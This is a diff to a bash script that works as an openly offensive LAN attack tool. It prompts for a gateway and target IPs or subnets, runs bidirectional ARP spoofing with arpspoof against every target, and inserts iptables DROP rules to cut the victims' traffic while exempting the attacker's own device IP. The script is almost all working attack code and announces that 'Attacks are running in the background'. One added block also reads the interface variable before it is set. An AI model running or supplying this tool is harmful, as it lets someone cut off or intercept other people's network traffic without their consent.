@@ -7,6 +7,13 @@ echo "Enter Router Gateway IP:"
 read -p "> " GATEWAY
 echo "Enter Target IP(s) or (space-separated) Multi IP's or Subnet (10.0.0.1/20):"
 read -p "> " TARGET_IPS
+
+# Detect Device IP
+echo "Enter Device IP: Enter to skip"
+IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
+read -p "> $IP" DEVIP
+MYIP="${DEVIP:-$IP}"
+
 echo "Enter Wifi Interface (wlan0):"
 read -p "> " INTERFACE
 
@@ -39,12 +46,7 @@ expand_subnet() {
 
 for TARGET in $TARGET_IPS; do
     if [[ "$TARGET" =~ / ]]; then
-       
-        # Block all traffic
-        iptables -I FORWARD -s "$TARGET" -j DROP
-        iptables -I FORWARD -d "$TARGET" -j DROP
-        iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
-     
+    
         # Expand subnet for ARP spoofing
         read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET")
         if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
@@ -56,21 +58,25 @@ for TARGET in $TARGET_IPS; do
             for ((i=START; i<=END; i++)); do
                 TARGET_IP=$(int2ip $i)
                 (
+                    # Block all the traffic except the device ip and gateway (bidirectional)
+                    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+                    iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+        
                     arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                     arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                 ) &
             done
         fi
     else
-        # Single IP
-        iptables -I FORWARD -s "$TARGET" -j DROP
-        iptables -I FORWARD -d "$TARGET" -j DROP
-        iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
- 
-        (
-            arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
-        ) &
+    (
+        # Blocking traffic for Single IP
+        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
+
+        # Bidirectional Arp Spoofing policy
+        arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
+        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+    ) &
     fi
 done
 echo "Attacks are running in the background...!!!"
